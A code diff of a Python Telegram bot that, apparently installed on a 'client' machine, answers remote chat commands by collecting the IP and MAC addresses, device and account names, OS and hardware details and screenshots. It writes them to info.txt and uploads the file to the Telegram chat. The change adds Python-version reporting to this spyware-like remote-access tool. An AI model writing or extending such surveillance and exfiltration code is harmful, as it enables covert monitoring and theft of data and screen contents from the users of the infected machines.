@@ -14,6 +14,11 @@ import psutil
 import os
 from screeninfo import get_monitors
 import pyautogui
+import sys
+
+
+sv = sys.version
+pv = (sv[0] + sv[1] + sv[2] + sv[3] + sv[4] + sv[5])
 
 
 
@@ -44,7 +49,6 @@ cur = connection.cursor()
 
 
 cpu_percent = psutil.cpu_percent(interval=1)
-
 memory_info = psutil.virtual_memory()
 
 def last_update(r):
@@ -162,6 +166,9 @@ def main():
             elif get_message_text(upd).lower() == "/mac":
                 send_message(get_chat_id(upd),
                              f"MAC-адрес клієнта: {mac}")
+            elif get_message_text(upd).lower() == "/python":
+                send_message(get_chat_id(upd),
+                             f"Версія Python клієнта: {pv}")
             elif get_message_text(upd).lower() == "/screenshot":
                 pyautogui.screenshot('screenshot_pyautogui.png')
                 text = 'Екран клієнта'
@@ -174,7 +181,7 @@ def main():
                              "Всі дані про клієнта в .txt форматі:")
                 file = open("info.txt", "w")
                 file.write(
-                    f"[================================================]\n IP клієнта: {a}\n Запит клієнта: {ip}\n Ім'я пристрою клієнта: {n}\n Ім'я облікового запису клієнта: {d_n}\n ОС: {my_system.system}\n Реліз ОС: {my_system.release}\n Версія: {my_system.version}\n Процессор: {my_system.processor}\n Монітор: {monitor.width}x{monitor.height}\n Інформація про батарею: {battery_info}\n Машина: {my_system.machine}\n MAC-адрес клієнта: {mac}\n Завантаженість ЦП: {cpu_percent}\n Завантаженість пам'яті: {memory_info.percent}\n[================================================]\n")  # Пишем
+                    f"[================================================]\n IP клієнта: {a}\n Запит клієнта: {ip}\n Ім'я пристрою клієнта: {n}\n Ім'я облікового запису клієнта: {d_n}\n Версія Python клієнта: {pv}\n ОС: {my_system.system}\n Реліз ОС: {my_system.release}\n Версія: {my_system.version}\n Процессор: {my_system.processor}\n Монітор: {monitor.width}x{monitor.height}\n Інформація про батарею: {battery_info}\n Машина: {my_system.machine}\n MAC-адрес клієнта: {mac}\n Завантаженість ЦП: {cpu_percent}\n Завантаженість пам'яті: {memory_info.percent}\n[================================================]\n")  # Пишем
                 file.close()
                 upfile = open("info.txt", "rb")
                 bot.send_document(get_chat_id(upd), upfile)
@@ -195,6 +202,8 @@ def main():
                              f"Ім'я пристрою клієнта: {n}")
                 send_message(get_chat_id(upd),
                              f"Ім'я облікового запису клієнта: {d_n}")
+                send_message(get_chat_id(upd),
+                             f"Версія Python клієнта: {pv}")
                 send_message(get_chat_id(upd),
                              f"ОС: {my_system.system}")
                 send_message(get_chat_id(upd),
